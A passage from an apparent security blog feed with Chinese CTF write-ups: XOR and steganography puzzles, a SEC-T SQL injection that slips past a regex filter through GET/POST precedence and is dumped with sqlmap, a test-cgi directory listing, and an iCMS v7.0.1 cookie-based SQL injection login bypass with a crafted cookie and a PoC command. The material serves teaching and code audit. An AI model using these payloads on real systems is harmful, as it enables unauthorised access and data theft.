<p>最后一行添上：print(func2(strr,key))<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170916/2.png?raw=true" alt=""></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">U_r_Greatt!</div></pre></td></tr></table></figure></p>
<h1 id="4-1"><a href="#4-1" class="headerlink" title="4.1"></a>4.1</h1><p>给了一张图片，用binwalk -e分解后得到day2’s secret.zip和tips.txt。</p>
<p>tips.txt的内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Although two days doing the same things, but day2 has a secret than day1</div></pre></td></tr></table></figure></p>
<p>考虑<a href="https://github.com/chishaxie/BlindWaterMark" target="_blank" rel="external">盲水印</a>。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170916/3.jpg?raw=true" alt=""></p>
<p>提交：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">My_c4t_Ho</div></pre></td></tr></table></figure></p>
<h1 id="4-2"><a href="#4-2" class="headerlink" title="4-2"></a>4-2</h1><p>古典密码，然后放到 quipqiup.com 解一下</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170916/4.png?raw=true" alt=""></p>
<p>得到flag。</p>
<h1 id="5-1"><a href="#5-1" class="headerlink" title="5-1"></a>5-1</h1><p>用xortool测试一下；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">root@chybeta:~/Desktop# xortool cipher -c 20</div><div class="line">The most probable key lengths:</div><div class="line">   2:   12.2%</div><div class="line">   5:   11.9%</div><div class="line">   9:   9.8%</div><div class="line">  13:   22.2%</div><div class="line">  20:   6.8%</div><div class="line">  22:   6.2%</div><div class="line">  26:   12.8%</div><div class="line">  30:   4.6%</div><div class="line">  39:   7.8%</div><div class="line">  52:   5.7%</div><div class="line">Key-length can be 3*n</div><div class="line">1 possible key(s) of length 13:</div><div class="line">Good\tuckToYou</div><div class="line">Found 1 plaintexts with 95.0%+ printable characters</div><div class="line">See files filename-key.csv, filename-char_used-perc_printable.csv</div></pre></td></tr></table></figure></p>
<p>猜测key为 GoodLuckToYou，写出脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="comment"># from secret import FLAG</span></div><div class="line"></div><div class="line">key  = <span class="string">"GoodLuckToYou"</span></div><div class="line">text = open(<span class="string">"cipher"</span>,<span class="string">"rb"</span>).read()</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_str</span><span class="params">(x, y)</span>:</span></div><div class="line">    <span class="keyword">if</span> len(x) &gt; len(y):</div><div class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([chr(ord(z) ^ ord(p)) <span class="keyword">for</span> (z, p) <span class="keyword">in</span> zip(x[:len(y)], y)])</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([chr(ord(z) ^ ord(p)) <span class="keyword">for</span> (z, p) <span class="keyword">in</span> zip(x, y[:len(x)])])</div><div class="line"></div><div class="line"><span class="comment"># flag, key = FLAG.encode('hex'), KEY.encode('hex')</span></div><div class="line"></div><div class="line">enc = xor_str(key * (len(text) // len(key) + <span class="number">1</span>), text)</div><div class="line"></div><div class="line">ef = open(<span class="string">'flag.txt'</span>, <span class="string">'w'</span>)</div><div class="line">ef.write(enc)</div><div class="line">ef.close()</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170916/7.png?raw=true" alt=""></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wdflag&#123;You Are Very Smart&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;问鼎杯 CTF writeup&lt;br&gt;
    
    </summary>
    
      <category term="writeup:MISC" scheme="http://chybeta.github.io/categories/writeup-MISC/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="misc" scheme="http://chybeta.github.io/tags/misc/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>SEC-T CTF2017-Naughty ads-writeup</title>
    <link href="http://chybeta.github.io/2017/09/14/SEC-T-CTF2017-Naughty-ads-writeup/"/>
    <id>http://chybeta.github.io/2017/09/14/SEC-T-CTF2017-Naughty-ads-writeup/</id>
    <published>2017-09-14T02:12:24.000Z</published>
    <updated>2017-09-17T10:44:01.133Z</updated>
    
    <content type="html"><![CDATA[<p>SEC-T CTF2017-Naughty ads-writeup<br>sql注入<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Can you put agent Gill in the naughty ad section? His phone number is &quot;555-31338&quot;</div><div class="line">Solves: 40</div><div class="line">Service: http://naughtyads.alieni.se/</div><div class="line">Author: avlidienbrunn</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>扫描器扫到robots.txt ，访问：<a href="http://naughtyads.alieni.se/robots.txt" target="_blank" rel="external">http://naughtyads.alieni.se/robots.txt</a></p>
<p>有一个admin，但访问需要输入账号和密码。</p>
<p>尝试访问： <a href="http://naughtyads.alieni.se/index.phps" target="_blank" rel="external">http://naughtyads.alieni.se/index.phps</a> 。得到源代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">require_once</span> <span class="string">'lib.php'</span>;</div><div class="line">header(<span class="string">'X-XSS-Protection: 0'</span>);</div><div class="line">$cols = <span class="keyword">array</span>(</div><div class="line">    <span class="string">"e8c4-437b-9476"</span>,</div><div class="line">    <span class="string">"849e-416e-acf7"</span>,</div><div class="line">    <span class="string">"7f9d-470f-8698"</span>,</div><div class="line">    <span class="string">"c8bb-4695-93f7"</span>,</div><div class="line">    <span class="string">"5fbc-4729-8821"</span>,</div><div class="line">    <span class="string">"3ad3-46c3-b975"</span>,</div><div class="line">    <span class="string">"f44f-4cc9-a5e0"</span>,</div><div class="line">    <span class="string">"0c3f-42c8-a0ae"</span></div><div class="line">    );</div><div class="line"></div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'id'</span>]))&#123;</div><div class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/'(?:\w*)\W*?[a-z].*(R|ELECT|OIN|NTO|HERE|NION)/i"</span>, $_REQUEST[<span class="string">'id'</span>]))&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"Attack detected!!!"</span>);</div><div class="line">    &#125;</div><div class="line">    $ad = get_ad($_GET[<span class="string">'id'</span>]);</div><div class="line">    <span class="meta">?&gt;</span></div><div class="line">    &lt;HTML&gt;</div><div class="line">    &lt;HEAD&gt;</div><div class="line">        &lt;TITLE&gt;NAUGHTY ADS ©<span class="number">1994</span>&lt;/TITLE&gt;</div><div class="line">    &lt;/HEAD&gt;</div><div class="line">    &lt;BODY BGCOLOR=<span class="string">"WHITE"</span>&gt;</div><div class="line">        &lt;CENTER&gt;</div><div class="line">        <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $ad[<span class="string">'description'</span>] <span class="meta">?&gt;</span>&lt;br /&gt;</div><div class="line">        &lt;a href=<span class="string">"/"</span>&gt;Home&lt;/a&gt;</div><div class="line">        &lt;/CENTER&gt;</div><div class="line">    &lt;/BODY&gt;</div><div class="line">    &lt;/HTML&gt;</div><div class="line">    <span class="meta">&lt;?php</span></div><div class="line">    <span class="keyword">die</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>对于 $_REQUEST[‘id’] ，进行了“严格”的正则匹配，不能正常的注出数据。接下来通过 $_GET[‘id’] 将其带入数据库中查询并返回结果给页面。</p>
<p>这里考察了一个知识。<a href="http://php.net/manual/zh/reserved.variables.request.php" target="_blank" rel="external">$_REQUEST</a>变量默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。在 php.ini 配置文件中，有一个参数variables_order<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170914/5.png?raw=true" alt=""></p>
<p>其中几个字母（EGPCS）对应如下： Environment, Get, Post, Cookie, Server。这些字母的出现顺序，表明了数据的加载顺序。从三种默认配置来看，相对顺序均是<code>GP</code>，也就是说只要有POST参数进来，那么它就会覆盖同名的GET参数。如下图；<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170914/6.png?raw=true" alt=""></p>
<p>所以就本题而言，如果在GET参数id处注入数据（比如 union select），而同时我们又通过POST方法传入一个id参数，那么服务器检测的是无害的POST数据，而在进行查询时带入的是有害的GET数据。</p>
<p>将如下数据包保存为test.txt，用sqlmap跑：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">POST /?id=* HTTP/1.1</div><div class="line">Host: naughtyads.alieni.se</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">DNT: 1</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: 18</div><div class="line"></div><div class="line">id= 0c3f-42c8-a0ae</div></pre></td></tr></table></figure></p>
<p>命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -r test.txt -D naughty --dump</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170914/7.png?raw=true" alt=""></p>
<p>得到账号密码，登陆 <a href="http://naughtyads.alieni.se/admin/" target="_blank" rel="external">http://naughtyads.alieni.se/admin/</a> 在Phone number处填上555-31338，提交后得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SECT&#123;~tr4nsv3stiT3s_w3lc0me_t00~&#125;</div></pre></td></tr></table></figure></p>
<p>其实那个正则，是有问题的。。。很容易绕过的啦。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SEC-T CTF2017-Naughty ads-writeup&lt;br&gt;sql注入&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>SEC-T CTF2017-Sprinkler system-writeup</title>
    <link href="http://chybeta.github.io/2017/09/14/SEC-T-CTF2017-Sprinkler-system-writeup/"/>
    <id>http://chybeta.github.io/2017/09/14/SEC-T-CTF2017-Sprinkler-system-writeup/</id>
    <published>2017-09-14T01:19:09.000Z</published>
    <updated>2017-09-17T10:44:00.456Z</updated>
    
    <content type="html"><![CDATA[<p>SEC-T CTF2017-Sprinkler system-writeup<br>test-cgi利用<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Solves: 102</div><div class="line"></div><div class="line">Service: http://sprinklers.alieni.se/</div><div class="line"></div><div class="line">Author: avlidienbrunn</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>发现有robots.txr。访问：<a href="http://sprinklers.alieni.se/robots.txt" target="_blank" rel="external">http://sprinklers.alieni.se/robots.txt</a></p>
<p>接着访问 <a href="http://sprinklers.alieni.se/cgi-bin/test-cgi" target="_blank" rel="external">http://sprinklers.alieni.se/cgi-bin/test-cgi</a><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170914/3.png?raw=true" alt=""></p>
<p>是 test-cgi ， 可以遍历目录。访问 <a href="http://sprinklers.alieni.se/cgi-bin/test-cgi?*" target="_blank" rel="external">http://sprinklers.alieni.se/cgi-bin/test-cgi?*</a></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170914/2.png?raw=true" alt=""></p>
<p>最后访问：<a href="http://sprinklers.alieni.se/cgi-bin/enable_sprinkler_system" target="_blank" rel="external">http://sprinklers.alieni.se/cgi-bin/enable_sprinkler_system</a></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SECT&#123;-p00l_On_t3h_r00f_must_h@v3_A_l3ak!-&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SEC-T CTF2017-Sprinkler system-writeup&lt;br&gt;test-cgi利用&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://chybeta.github.io/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://chybeta.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="http://chybeta.github.io/tags/writeup/"/>
    
      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ICMSv7.0.1 admincp.class.php sql注入分析</title>
    <link href="http://chybeta.github.io/2017/09/12/ICMSv7-0-1-admincp-class-php-sql%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/"/>
    <id>http://chybeta.github.io/2017/09/12/ICMSv7-0-1-admincp-class-php-sql注入分析/</id>
    <published>2017-09-12T06:19:23.000Z</published>
    <updated>2017-09-12T10:26:33.999Z</updated>
    
    <content type="html"><![CDATA[<p>ICMSv7.0.1 admincp.class.php sql注入分析<br>代码审计学习中<br><a id="more"></a><br>下载地址：<a href="https://github.com/idreamsoft/iCMS/releases/tag/v7.0.1" target="_blank" rel="external">ICMSv7.0.1</a></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>出现漏洞的地方在 app\admincp\admincp.class.php 的init函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</div><div class="line">		<span class="keyword">self</span>::check_seccode(); <span class="comment">//验证码验证</span></div><div class="line"></div><div class="line">		iUI::$dialog[<span class="string">'title'</span>] = iPHP_APP;</div><div class="line">		iDB::$show_errors     = <span class="keyword">true</span>;</div><div class="line">		iDB::$show_trace      = <span class="keyword">false</span>;</div><div class="line">		iDB::$show_explain    = <span class="keyword">false</span>;</div><div class="line"></div><div class="line">		members::$LOGIN_PAGE  = ACP_PATH.<span class="string">'/template/admincp.login.php'</span>;</div><div class="line">		members::$GATEWAY     = iPHP::PG(<span class="string">'gateway'</span>);</div><div class="line">		members::check_login(); <span class="comment">//用户登陆验证</span></div><div class="line">		members::check_priv(<span class="string">'ADMINCP'</span>,<span class="string">'page'</span>);<span class="comment">//检查是否有后台权限</span></div><div class="line"></div><div class="line">		files::init(<span class="keyword">array</span>(<span class="string">'userid'</span>=&gt; members::$userid));</div><div class="line">		<span class="comment">//菜单</span></div><div class="line">		menu::init();</div><div class="line">		menu::$callback = <span class="keyword">array</span>(</div><div class="line">			<span class="string">"priv"</span> =&gt; <span class="keyword">array</span>(<span class="string">"members"</span>,<span class="string">"check_priv"</span>),</div><div class="line">			<span class="string">"hkey"</span> =&gt; members::$userid</div><div class="line">        );</div><div class="line"></div><div class="line">        admincp::$callback = <span class="keyword">array</span>(</div><div class="line">			<span class="string">"history"</span> =&gt; <span class="keyword">array</span>(<span class="string">"menu"</span>,<span class="string">"history"</span>),</div><div class="line">			<span class="string">"priv"</span>    =&gt; <span class="keyword">array</span>(<span class="string">"members"</span>,<span class="string">"check_priv"</span>)</div><div class="line">        );</div><div class="line">	&#125;</div></pre></td></tr></table></figure></p>
<p>在用户登陆验证，调用members::check_login()，跟进，其代码如下：<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">public static function check_login() &#123;</div><div class="line">//        self::$LOGIN_COUNT = (int)authcode(get_cookie('iCMS_LOGIN_COUNT'),'DECODE');</div><div class="line">//        if(self::$LOGIN_COUNT&gt;iCMS_LOGIN_COUNT) exit();</div><div class="line"></div><div class="line">	 $a   = iSecurity::escapeStr($_POST['username']);</div><div class="line">	 $p   = iSecurity::escapeStr($_POST['password']);</div><div class="line">	 $ip  = iPHP::get_ip();</div><div class="line">	 $sep = iPHP_AUTH_IP?'#=iCMS['.$ip.']=#':'#=iCMS=#';</div><div class="line">	 if(empty($a) &amp;&amp; empty($p)) &#123;</div><div class="line">		 $auth       = iPHP::get_cookie(self::$AUTH);</div><div class="line">		 list($a,$p) = explode($sep,authcode($auth,'DECODE'));</div><div class="line">		 $c = self::check($a,$p);</div><div class="line">	 &#125;else &#123;</div><div class="line">		 $p = md5($p);</div><div class="line">		 $c = self::check($a,$p);</div><div class="line">		 if ($c)&#123;</div><div class="line">			 iDB::query("</div><div class="line">				 UPDATE `#iCMS@__members`</div><div class="line">				 SET `lastip`='".$ip."',</div><div class="line">				 `lastlogintime`='".time()."',</div><div class="line">				 `logintimes`=logintimes+1</div><div class="line">				 WHERE `uid`='".self::$userid."'</div><div class="line">			 ");</div><div class="line">			 iPHP::set_cookie(self::$AUTH,authcode($a.$sep.$p,'ENCODE'));</div><div class="line">		 &#125;</div><div class="line">	 &#125;</div><div class="line">	 return self::result($c);</div><div class="line"> &#125;</div></pre></td></tr></table></figure></p>
<p><code>$a</code>和<code>$p</code>分别是用户名和密码，会先经过escapeStr的过滤，若不为空且通过了self::check($a,$p)的检查即可登陆成功。若为空，则会从cookie里获取值，并通过<code>list($a,$p) = explode($sep,authcode($auth,&#39;DECODE&#39;));</code>获取到用户名和密码，并进行检查self::check($a,$p)。</p>
<p>self::check()的部分代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($a,$p)</span> </span>&#123;</div><div class="line">	 <span class="keyword">if</span>(<span class="keyword">empty</span>($a) &amp;&amp; <span class="keyword">empty</span>($p)) &#123;</div><div class="line">		 <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">	 &#125;</div><div class="line"></div><div class="line">	 <span class="keyword">self</span>::$data = iDB::row(<span class="string">"SELECT * FROM `#iCMS@__members` WHERE `username`='&#123;$a&#125;' AND `password`='&#123;$p&#125;' AND `status`='1' LIMIT 1;"</span>);</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>通常情况下，要从登陆口进行注入，传入的参数会进行escapeStr()的过滤，而escapeStr()是比较严格的：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">escapeStr</span><span class="params">($string)</span> </span>&#123;</div><div class="line">	<span class="keyword">if</span>(is_array($string)) &#123;</div><div class="line">		<span class="keyword">foreach</span>($string <span class="keyword">as</span> $key =&gt; $val) &#123;</div><div class="line">			$string[$key] = iSecurity::escapeStr($val);</div><div class="line">		&#125;</div><div class="line">	&#125; <span class="keyword">else</span> &#123;</div><div class="line">		$string = str_replace(<span class="keyword">array</span>(<span class="string">'%00'</span>,<span class="string">'\\0'</span>,<span class="string">"\0"</span>,<span class="string">"\x0B"</span>), <span class="string">''</span>, $string); <span class="comment">//modified@2010-7-5</span></div><div class="line">		$string = str_replace(<span class="keyword">array</span>(<span class="string">'&amp;'</span>, <span class="string">'"'</span>,<span class="string">"'"</span>, <span class="string">'&lt;'</span>, <span class="string">'&gt;'</span>), <span class="keyword">array</span>(<span class="string">'&amp;amp;'</span>, <span class="string">'&amp;quot;'</span>,<span class="string">'&amp;#039;'</span>, <span class="string">'&amp;lt;'</span>, <span class="string">'&amp;gt;'</span>), $string);</div><div class="line">		$string = preg_replace(<span class="string">'/&amp;amp;((#(\d&#123;3,5&#125;|x[a-fA-F0-9]&#123;4&#125;)|[a-zA-Z][a-z0-9]&#123;2,5&#125;);)/'</span>, <span class="string">'&amp;\\1'</span>,$string);</div><div class="line">		$string = str_replace(<span class="string">'\\\\'</span>, <span class="string">'&amp;#92;'</span>, $string);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> $string;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>对单双引号都做了过滤，因此若是直接注入，会闭合失败。</p>
<p>考虑从cookie获取参数的路径，即下面这段代码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($a) &amp;&amp; <span class="keyword">empty</span>($p)) &#123;</div><div class="line">	$auth       = iPHP::get_cookie(<span class="keyword">self</span>::$AUTH);</div><div class="line">	<span class="keyword">list</span>($a,$p) = explode($sep,authcode($auth,<span class="string">'DECODE'</span>));</div><div class="line">	$c = <span class="keyword">self</span>::check($a,$p);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>从cookie中恢复的<code>$a</code>和<code>$p</code>没有再进行检查。所以假设我们能构造一个cookie，使得从explode恢复出来的<code>$a</code>和<code>$p</code>包含引号能够闭合，那就能引发sql注入了。</p>
<p>假设username为<code>&#39; or 1=1%23</code>，password为随意，则期望的sql注入语句为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT * FROM `#iCMS@__members` WHERE `username`=&apos;&apos; or 1=1#&apos; AND `password`=&apos;1&apos; AND `status`=&apos;1&apos; LIMIT</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170912/3.png?raw=true" alt=""></p>
<p>生成的对应的cookie即为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">4a62f154%2B9j%2BoQdL3%2BsaUTFDkMvY6WSLPzfJIFgd%2FBLE1ghVDuX4WQjoLW7es0tR60E</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170912/4.png?raw=true" alt=""></p>
<p>可以看到已经登陆成功。</p>
<p><a href="https://github.com/CHYbeta/cmsPoc" target="_blank" rel="external">cmsPoc</a>里提供了python版本的poc，对应命令如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python cmspoc.py -t icms -s v701_sqlinject_getadmin -u http://10.10.10.1:2500/iCMS-7.0.1/admincp.php</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170912/6.png?raw=true" alt=""></p>
<h1 id="修补方案"><a href="#修补方案" class="headerlink" title="修补方案"></a>修补方案</h1><p>官方在 <a href="https://github.com/idreamsoft/iCMS/releases/tag/v7.0.2" target="_blank" rel="external">v7.0.2</a>中修复了该漏洞，在members::check_login()函数中，当从cookie中获取到$a,$p后先进行了一次addslashes，之后才进行查询。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170912/5.png?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;ICMSv7.0.1 admincp.class.php sql注入分析&lt;br&gt;代码审计学习中&lt;br&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
    
    
      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
    
      <category term="sql注入" scheme="http://chybeta.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>ASISCTF2017-Simple Crypto-writeup</title>
    <link href="http://chybeta.github.io/2017/09/12/ASISCTF2017-Simple-Crypto-writeup/"/>
    <id>http://chybeta.github.io/2017/09/12/ASISCTF2017-Simple-Crypto-writeup/</id>
    <published>2017-09-11T23:34:41.000Z</published>
    <updated>2017-09-12T10:29:02.562Z</updated>
    
    <content type="html"><![CDATA[<p>ASISCTF2017-Simple Crypto-writeup<br>简单异或加密<br><a id="more"></a></p>
<h1 id="Task"><a href="#Task" class="headerlink" title="Task"></a>Task</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Begining always needs an interesting challenge, we can assure you, this challenge is an interesting one to begin the CTF!</div><div class="line">Challange Updated, please redownload the binary file!</div><div class="line"></div><div class="line">https://asisctf.com/tasks/simple_crypto_e5189fe3d3d64de3d612de266315a9e96dc43787</div></pre></td></tr></table></figure>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>下载下来后解压得到两个文件flag.enc和simple.py。flag.enc是加密后的文件，simple.py是加密算法的实现，其代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/python</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> random</div><div class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</div><div class="line"></div><div class="line">KEY = <span class="string">'musZTXmxV58UdwiKt8Tp'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_str</span><span class="params">(x, 